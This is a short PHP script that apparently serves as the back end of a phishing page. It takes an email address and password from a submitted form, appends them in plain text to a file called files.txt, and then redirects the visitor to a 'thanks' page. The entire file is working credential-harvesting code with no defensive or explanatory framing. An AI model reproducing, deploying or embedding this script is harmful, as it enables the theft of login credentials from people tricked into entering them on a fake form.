<?php
if(isset($_POST['email']) && isset($_POST['password'])) {
    $data = $_POST['email'] . '-' . $_POST['password'] . "\n";
    $ret = file_put_contents('files.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('error!');
    }
    else {
        echo "Done";
    }
}
else {
   die('more errors');
}
header("Location: thanks.html");
die();
?>
